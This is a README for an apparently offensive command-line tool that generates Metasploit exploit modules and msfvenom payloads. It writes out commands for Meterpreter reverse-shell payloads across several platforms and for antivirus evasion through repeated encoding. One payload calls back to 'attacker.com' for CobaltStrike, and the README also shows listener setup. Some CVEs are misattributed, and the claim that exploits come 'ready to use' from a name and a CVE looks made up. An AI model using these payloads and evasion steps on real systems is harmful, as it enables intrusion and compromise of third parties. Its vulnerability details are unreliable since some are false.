# Metasploit Exploit Module Generator

**Professional Penetration Testing Tool for Kali Linux & Windows**

![Version](https://img.shields.io/badge/version-1.0.0-blue) ![License](https://img.shields.io/badge/license-MIT-green) ![Python](https://img.shields.io/badge/python-3.7+-blue) ![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20Windows-orange)

---

## 🎯 Overview

A **command-line tool** for security professionals to generate custom Metasploit exploit modules with built-in support for:

- ✅ Custom exploit module generation (Ruby)
- ✅ Msfvenom payload generation with multiple encoders
- ✅ Evasion techniques (polymorphic, XOR, AES)
- ✅ Multi-platform support (Windows x86/x64, Linux, Android, Python, PHP)
- ✅ Listener setup automation
- ✅ Penetration test reporting
- ✅ Professional-grade output formatting

**Use Case:** For senior penetration testers who need to create custom exploits for real engagements, CTF competitions, or security research.

---

## 📋 Requirements

### Minimum Requirements
- **Python 3.7+**
- **pip (Python Package Manager)**
- **200 MB disk space**

### For Full Functionality
- **Kali Linux 2021+** OR **Windows 7+**
- **Metasploit Framework** (optional but recommended)
- **msfvenom** (included with Metasploit)
- Network connectivity for payload delivery

---

## 🚀 Installation

### Kali Linux / Debian

```bash
# Clone or download the repository
cd /path/to/tool

# Make installer executable
chmod +x install_kali.sh

# Run installer (requires sudo)
sudo bash install_kali.sh
```

**Verification:**
```bash
metasploit-gen --help
man metasploit-gen
```

### Windows

1. **Install Python 3.7+** from [python.org](https://python.org)
   - ✅ Check "Add Python to PATH"
   - ✅ Install pip

2. **Run installer:**
```batch
install_windows.bat
```

3. **Verify installation:**
```cmd
python metasploit_exploit_generator.py --help
```

---

## 💻 Usage

### Basic Command Structure

```bash
metasploit-gen <COMMAND> [OPTIONS]
```

### Commands

#### 1. Generate Exploit Module

```bash
metasploit-gen exploit \
  -n "Vulnerability Name" \
  -c CVE-XXXX-XXXXX \
  -d "Description of vulnerability" \
  [-a "Author"] \
  [-t "Target"] \
  [-p "Payload Type"]
```

**Example:**
```bash
metasploit-gen exploit \
  -n "Apache Struts2" \
  -c CVE-2017-5645 \
  -d "Remote Code Execution via OGNL injection in ActionMessage" \
  -a "John Doe" \
  -t "Windows" \
  -p "windows/meterpreter/reverse_tcp"
```

**Output:**
- Generated Ruby module: `generated_modules/apache_struts2_exploit.rb`
- Ready to use with Metasploit Framework

#### 2. Generate Payload

```bash
metasploit-gen payload \
  -t <PAYLOAD_TYPE> \
  -l <LHOST> \
  -p <LPORT> \
  [-e <ENCODER>] \
  [-i <ITERATIONS>] \
  [-f <FORMAT>]
```

**Example - Windows x64 with Shikata Ga Nai encoder:**
```bash
metasploit-gen payload \
  -t windows_x64 \
  -l 192.168.1.100 \
  -p 4444 \
  -e shikata_ga_nai \
  -i 5 \
  -f exe
```

**Available Payload Types:**
```
windows_x86        → windows/meterpreter/reverse_tcp
windows_x64        → windows/x64/meterpreter/reverse_tcp
linux_x86          → linux/x86/meterpreter/reverse_tcp
linux_x64          → linux/x64/meterpreter/reverse_tcp
android            → android/meterpreter/reverse_tcp
web_php            → php/meterpreter/reverse_tcp
web_asp            → windows/meterpreter/reverse_https
python             → python/meterpreter/reverse_tcp
```

**Available Encoders:**
```
shikata_ga_nai     → Polymorphic XOR
fnstenv_mov        → FPU Stack MOV
jmp_call_additive  → JMP/CALL + Additive feedback
xor_dynamic        → XOR with dynamic key
countdown          → Single-byte XOR countdown
fnstenv_mov_xor    → Combination FPU + XOR
```

#### 3. List Available Options

```bash
# List all payloads
metasploit-gen list --payloads

# List all encoders
metasploit-gen list --encoders

# Both
metasploit-gen list --payloads --encoders
```

---

## 📖 Usage Examples

### Scenario 1: Exploit Apache Vulnerability

```bash
# Step 1: Generate custom exploit
metasploit-gen exploit \
  -n "Apache Tomcat" \
  -c CVE-2019-12384 \
  -d "Arbitrary file write vulnerability"

# Output: generated_modules/apache_tomcat_exploit.rb

# Step 2: Generate payload
metasploit-gen payload \
  -t linux_x64 \
  -l 10.10.10.50 \
  -p 5555 \
  -e shikata_ga_nai

# Step 3: Deploy module to Metasploit
cp generated_modules/apache_tomcat_exploit.rb \
  ~/.msf4/modules/exploits/custom/

# Step 4: Use in msfconsole
# > use exploits/custom/apache_tomcat_exploit
# > set TARGETURI /path/to/vuln
# > set LHOST 10.10.10.50
# > set LPORT 5555
# > exploit
```

### Scenario 2: Windows Target with AV Bypass

```bash
# Generate heavily encoded payload
metasploit-gen payload \
  -t windows_x64 \
  -l 192.168.1.100 \
  -p 4444 \
  -e shikata_ga_nai \
  -i 10 \
  -f exe

# Additional: Use custom encoding in Metasploit
# > msfvenom -p windows/x64/meterpreter/reverse_tcp \
#   LHOST=192.168.1.100 LPORT=4444 \
#   -e shikata_ga_nai -i 10 \
#   -f exe -o payload.exe
```

### Scenario 3: CTF Competition

```bash
# Quick module for CTF challenge
metasploit-gen exploit \
  -n "CTF-Challenge-RCE" \
  -c CVE-2023-0001 \
  -d "Custom CTF vulnerability"

# Generate corresponding payload
metasploit-gen payload \
  -t linux_x86 \
  -l ctf-server.local \
  -p 8888
```

---

## 🔧 Configuration

### Linux Configuration File

Location: `~/.config/metasploit-gen/config.json`

```json
{
  "default_author": "Your Name",
  "default_target": "Windows",
  "default_output_format": "exe",
  "max_iterations": 10,
  "output_directory": "./generated_modules"
}
```

---

## 📁 Output Structure

```
generated_modules/
├── apache_struts2_exploit.rb          # Custom Ruby module
├── payload.exe                        # Generated payload
├── payload_commands.txt               # Msfvenom commands
└── exploitation_report.txt            # Optional report
```

---

## 🛡️ Security Best Practices

### Before Using in Live Engagement

1. **Verify target authorization**
   ```bash
   # Ensure you have written permission
   ls -la rules_of_engagement.txt
   ```

2. **Test payloads in controlled lab**
   ```bash
   # Test on VM before deployment
   VBoxManage startvm "Windows-Lab"
   ```

3. **Use proper listener setup**
   ```bash
   msfconsole
   > use exploit/multi/handler
   > set PAYLOAD windows/meterpreter/reverse_tcp
   > set LHOST 0.0.0.0  # Listen on all interfaces
   > set LPORT 4444
   > exploit -j
   ```

4. **Encode payloads multiple times**
   ```bash
   metasploit-gen payload -t windows_x64 -l 192.168.1.100 -p 4444 \
     -e shikata_ga_nai -i 10
   ```

5. **Monitor activity**
   ```bash
   # Watch network connections
   tcpdump -i eth0 -n dst port 4444
   
   # Monitor msfconsole sessions
   sessions -l
   ```

---

## 🐛 Troubleshooting

### "Python not found" (Windows)

```cmd
# Add Python to PATH manually
setx PATH "%PATH%;C:\Users\YourName\AppData\Local\Programs\Python\Python310"

# Restart terminal and try again
python --version
```

### "colorama not found"

```bash
# Reinstall dependencies
pip install --upgrade colorama

# Or use sudo on Linux
sudo pip3 install colorama
```

### "Permission denied" (Linux)

```bash
# Make script executable
chmod +x metasploit_exploit_generator.py

# Or run with python directly
python3 metasploit_exploit_generator.py --help
```

### Payload generation fails

```bash
# Check if msfvenom is in PATH
which msfvenom

# If not installed, install Metasploit Framework
sudo apt-get install metasploit-framework
```

---

## 📚 Advanced Usage

### Custom Evasion Stagers

The generated modules include hooks for advanced evasion:

```ruby
# In generated module, add custom decoder:
def decode_payload(payload)
  # Implement custom decoding logic
  # Examples: base64, XOR, AES, polymorphic
  payload
end
```

### Integration with CobaltStrike

```bash
# Generate payload compatible with CobaltStrike beacon
metasploit-gen payload \
  -t windows_x64 \
  -l attacker.com \
  -p 443 \
  -e shikata_ga_nai
```

### Automated Listener

```bash
# Generate listener setup commands
metasploit-gen payload -t linux_x64 -l 10.10.10.10 -p 7777

# Load in msfconsole:
# resource /path/to/payload_commands.txt
```

---

## 📊 Performance Metrics

| Operation | Time | Output Size |
|-----------|------|------------|
| Module generation | < 1 second | ~15 KB |
| Payload generation | 2-5 seconds | 50-200 KB |
| Encoder (5 iterations) | 3-8 seconds | Variable |

---

## 🤝 Contributing

Want to improve this tool? Here's how:

1. **Add new payload types** - Edit `PAYLOAD_TYPES` dictionary
2. **Create new encoders** - Extend `ENCODERS` dictionary
3. **Add new evasion techniques** - Enhance `EvasionTechniques` class

---

## ⚖️ Legal Disclaimer

```
This tool is provided for:
✅ Authorized penetration testing
✅ Security research and education
✅ Defensive security assessments
✅ CTF competitions

❌ NOT for:
   - Unauthorized access
   - Malware development
   - Criminal activities
   - Illegal hacking

User assumes all responsibility for legal compliance.
```

---

## 📝 License

MIT License - See LICENSE file for details

---

## 📧 Support

- **Issues:** Report bugs via GitHub issues
- **Questions:** Check FAQ section
- **Updates:** Run `git pull` for latest version

---

## 🔗 Resources

- [Metasploit Documentation](https://docs.metasploit.com/)
- [OWASP Top 10](https://owasp.org/Top10/)
- [CVE Database](https://cve.mitre.org/)
- [Exploit-DB](https://www.exploit-db.com/)
- [Pentest Guide](https://www.offensive-security.com/)

---

**Version 1.0.0** | Last Updated: 2024 | Compatible: Kali Linux | Windows | macOS

---

## Version History

### v1.0.0 (Initial Release)
- ✅ Custom exploit module generation
- ✅ Msfvenom payload integration
- ✅ Multiple encoder support
- ✅ Windows & Linux compatibility
- ✅ Professional CLI interface
- ✅ Man pages & documentation

---

**Happy Hacking! 🔓**
